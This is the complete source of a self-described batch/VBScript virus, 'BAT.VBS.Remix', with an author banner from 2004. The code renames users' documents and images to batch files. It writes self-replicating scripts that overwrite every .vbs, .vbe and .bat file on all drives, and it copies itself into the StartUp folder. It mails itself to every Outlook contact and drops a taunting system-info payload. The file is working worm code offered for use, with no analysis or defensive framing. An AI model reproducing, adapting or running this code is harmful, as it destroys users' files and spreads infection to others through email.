   :: BAT.REMIX_____________________________________________________________
   ::    _______   _______   _       _   _______       ____   ____  _______
   ::   / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
   ::  / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
   ::  \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
   ::  /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
   ::  \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
   :: ________________________http://trax.to/sevenC_________________________
   :: ________________________sevenC_zone@yahoo.com_________________________
   :: Bat will rename all doc,txt,gif,jpg files to BATCH
   :: in  C:\ , Windir & My Document.
   :: Bat Will create 2 vbs files in windows directory (relax.vbs & relax.c.vbs)
   :: and VBS will infect all batch files that has been renemed before.
   :: I think bat almost do nothing,Coz VBS is the main Virus here.
   :: VBS Also infect all VBS files with it's body and helping bat
   :: To spred Via Outlook with Subject : " Do not Open " and Body :
   :: "This file is a life virus do not open !!" with Important.bat
   :: as an attacment.
   ::
   :: sevenC / IVWA
   :: Jan 21 2004
   :: Indonesia
   :: ______________________________________________________________________
   ::
   ::
   @ctty nul
   @echo off
   @copy %0 %windir%\relax.bat
   @for %%a in (C:\windows\*.txt) do ren %%a *.bat
   @for %%a in (C:\windows\*.gif) do ren %%a *.bat
   @for %%a in (C:\windows\*.jpg) do ren %%a *.bat
   @for %%a in (C:\Mydocu~1\*.txt) do ren %%a *.bat
   @for %%a in (C:\Mydocu~1\*.doc) do ren %%a *.bat
   @for %%a in (C:\*.txt) do ren %%a *.bat
   @for %%a in (C:\windows\*.bmp) do ren %%a *.bat
   @for %%a in (C:\Mydocu~1\*.bmp) do ren %%a *.bat
   @echo.On Error Resume Next>>C:\windows\relax.vbs
   @echo.On Error Resume Next>>C:\windows\relax.vbs
   @echo Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder >>C:\windows\relax.vbs
   @echo Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder >>C:\windows\relax.c.vbs
   @echo Set sucke = wscript.CreateObject("WScript.Shell")>>C:\windows\relax.vbs
   @echo Set sucke = wscript.CreateObject("WScript.Shell")>>C:\windows\relax.c.vbs
   @echo Set Fso = CreateObject("scripting.FileSystemObject")>>C:\windows\relax.vbs
   @echo Set Fso = CreateObject("scripting.FileSystemObject")>>C:\windows\relax.c.vbs
   @echo Set Drives=fso.drives>>C:\windows\relax.vbs
   @echo Set Drives=fso.drives>>C:\windows\relax.c.vbs
   @echo Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)>>C:\windows\relax.vbs
   @echo Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)>>C:\windows\relax.c.vbs
   @echo src = dropper.readall>>C:\windows\relax.vbs
   @echo src = dropper.readall>>C:\windows\relax.c.vbs
   @echo set Trange = document.body.CreateTextRange>>C:\windows\relax.vbs
   @echo set Trange = document.body.CreateTextRange>>C:\windows\relax.c.vbs
   @echo Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.vbs">>C:\windows\relax.vbs
   @echo Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.vbs">>C:\windows\relax.c.vbs
   @echo fso.Copyfile("C:\windows\relax.bat"), "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.bat">>C:\windows\relax.vbs
   @echo fso.Copyfile("C:\windows\relax.bat"), "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.bat">>C:\windows\relax.c.vbs
   @echo Set Fso = createobject("scripting.filesystemobject") >>C:\windows\relax.vbs
   @echo Set Fso = createobject("scripting.filesystemobject") >>C:\windows\relax.c.vbs
   @echo Set Drives=fso.drives >>C:\windows\relax.vbs
   @echo Set Drives=fso.drives >>C:\windows\relax.c.vbs
   @echo For Each Drive in Drives>>C:\windows\relax.vbs
   @echo For Each Drive in Drives>>C:\windows\relax.c.vbs
   @echo If drive.isready then>>C:\windows\relax.vbs
   @echo If drive.isready then>>C:\windows\relax.c.vbs
   @echo Dosearch drive & "\">>C:\windows\relax.vbs
   @echo Dosearch drive & "\">>C:\windows\relax.c.vbs
   @echo end If >>C:\windows\relax.vbs
   @echo end If >>C:\windows\relax.c.vbs
   @echo Next >>C:\windows\relax.vbs
   @echo Next >>C:\windows\relax.c.vbs
   @echo Function Dosearch(Path) >>C:\windows\relax.vbs
   @echo Function Dosearch(Path) >>C:\windows\relax.c.vbs
   @echo Set Folder=fso.getfolder(path) >>C:\windows\relax.vbs
   @echo Set Folder=fso.getfolder(path) >>C:\windows\relax.c.vbs
   @echo Set Files = folder.files>>C:\windows\relax.vbs
   @echo Set Files = folder.files>>C:\windows\relax.c.vbs
   @echo For Each File in files>>C:\windows\relax.vbs
   @echo For Each File in files>>C:\windows\relax.c.vbs
   @echo If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then >>C:\windows\relax.vbs
   @echo If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then >>C:\windows\relax.c.vbs
   @echo Set ooooo = Fso.OpenTextFile("C:\windows\relax.c.vbs")>>C:\windows\relax.vbs
   @echo Set ooooo = Fso.OpenTextFile("C:\windows\relax.vbs")>>C:\windows\relax.c.vbs
   @echo oooooo = ooooo.readall >>C:\windows\relax.vbs
   @echo oooooo = ooooo.readall >>C:\windows\relax.c.vbs
   @echo ooooo.close >>C:\windows\relax.vbs
   @echo ooooo.close >>C:\windows\relax.c.vbs
   @echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.vbs
   @echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.c.vbs
   @echo dropper.write oooooo>>C:\windows\relax.vbs
   @echo dropper.write oooooo>>C:\windows\relax.c.vbs
   @echo dropper.Close>>C:\windows\relax.vbs
   @echo dropper.Close>>C:\windows\relax.c.vbs
   @echo end if>>C:\windows\relax.vbs
   @echo end if>>C:\windows\relax.c.vbs
   @echo If fso.GetExtensionName(file.path)="bat" then >>C:\windows\relax.vbs
   @echo If fso.GetExtensionName(file.path)="bat" then >>C:\windows\relax.c.vbs
   @echo Set fso = createobject("scripting.filesystemobject") >>C:\windows\relax.vbs
   @echo Set fso = createobject("scripting.filesystemobject") >>C:\windows\relax.c.vbs
   @echo Set ooooo = fso.opentextfile("C:\windows\relax.bat") >>C:\windows\relax.vbs
   @echo Set ooooo = fso.opentextfile("C:\windows\relax.bat") >>C:\windows\relax.c.vbs
   @echo oooooo = ooooo.readall >>C:\windows\relax.vbs
   @echo oooooo = ooooo.readall >>C:\windows\relax.c.vbs
   @echo ooooo.close >>C:\windows\relax.vbs
   @echo ooooo.close >>C:\windows\relax.c.vbs
   @echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.vbs
   @echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.c.vbs
   @echo dropper.write oooooo>>C:\windows\relax.vbs
   @echo dropper.write oooooo>>C:\windows\relax.c.vbs
   @echo dropper.Close>>C:\windows\relax.vbs
   @echo dropper.Close>>C:\windows\relax.c.vbs
   @echo end if>>C:\windows\relax.vbs
   @echo end if>>C:\windows\relax.c.vbs
   @echo next>>C:\windows\relax.vbs
   @echo next>>C:\windows\relax.c.vbs
   @echo Set Subfolders = folder.SubFolders >>C:\windows\relax.vbs
   @echo Set Subfolders = folder.SubFolders >>C:\windows\relax.c.vbs
   @echo For Each Subfolder in Subfolders >>C:\windows\relax.vbs
   @echo For Each Subfolder in Subfolders >>C:\windows\relax.c.vbs
   @echo Dosearch Subfolder.path >>C:\windows\relax.vbs
   @echo Dosearch Subfolder.path >>C:\windows\relax.c.vbs
   @echo Next >>C:\windows\relax.vbs
   @echo Next >>C:\windows\relax.c.vbs
   @echo end function >>C:\windows\relax.vbs
   @echo end function >>C:\windows\relax.c.vbs
   @echo 'BAT.VBS.Remix>>C:\windows\relax.vbs
   @echo 'BAT.VBS.Remix>>C:\windows\relax.c.vbs
   @echo 'CREATED BY sevenC>>C:\windows\relax.vbs
   @echo 'CREATED BY sevenC>>C:\windows\relax.c.vbs
   @Cscript C:\windows\relax.vbs
   @copy %0 C:\relax.bat
   @echo Dim x > C:\fun.vbs
   @echo.on error resume next >> C:\fun.vbs
   @echo Set fso = CreateObject("Scripting.FileSystemObject") >> C:\fun.vbs
   @echo Set ol=CreateObject("Outlook.Application") >> C:\fun.vbs
   @echo Set out=WScript.CreateObject("Outlook.Application") >> C:\fun.vbs
   @echo Set mapi = out.GetNameSpace("MAPI") >> C:\fun.vbs
   @echo Set a = mapi.AddressLists(1) >> C:\fun.vbs
   @echo Set ae=a.AddressEntries >> C:\fun.vbs
   @echo For x=1 To ae.Count >> C:\fun.vbs
   @echo Set ci=ol.CreateItem(0) >> C:\fun.vbs
   @echo Set Mail=ci >> C:\fun.vbs
   @echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\fun.vbs
   @echo Mail.Subject="Do not open" >> C:\fun.vbs
   @echo Mail.Body="This file is a life virus do not open..!!" >> C:\fun.vbs
   @echo Mail.Attachments.Add("C:\windows\relax.bat") >> C:\fun.vbs
   @echo Mail.Send >> C:\fun.vbs
   @echo Next >> C:\fun.vbs
   @echo ol.Quit >> C:\fun.vbs
   @cscript C:\fun.vbs
   @del C:\fun.vbs
   @del C:\relax.bat
   :: Payload [Create OemInfo.ini in C:\windows\system\]
   :: **************************************************
   @echo.|date|find "19">nul
   @if not errorlevel 1 goto indo
   @echo [General]>>C:\Windows\system\Oeminfo.ini
   @echo Manufacturer="VIRUS INFORMATION">>C:\Windows\system\Oeminfo.ini
   @echo Model="BAT.VBS.Remix by sevenC">>C:\Windows\system\Oeminfo.ini
   @echo [Support Information]>>C:\Windows\system\Oeminfo.ini
   @echo Line1="BAT.VBS.Remix Payload">>C:\Windows\system\Oeminfo.ini
   @echo Line2="*********************************">>C:\Windows\system\Oeminfo.ini
   @echo Line3="Your computer has been attacked with my virus">>C:\Windows\system\Oeminfo.ini
   @echo Line4="Please Don't be sad">>C:\Windows\system\Oeminfo.ini
   @echo Line5="Coz I just infect BAT,VBE and VBS files">>C:\Windows\system\Oeminfo.ini
   @echo Line6="I think you don't need that files">>C:\Windows\system\Oeminfo.ini
   @echo Line7="********************************************************************">>C:\Windows\system\Oeminfo.ini
   @echo Line8="BAT.VBS.Remix By sevenC">>C:\Windows\system\Oeminfo.ini
   @echo Line9="Created on friday 23th January 2004">>C:\Windows\system\Oeminfo.ini
   @echo Line10="-Bekasi.Indonesia-">>C:\Windows\system\Oeminfo.ini
   :indo
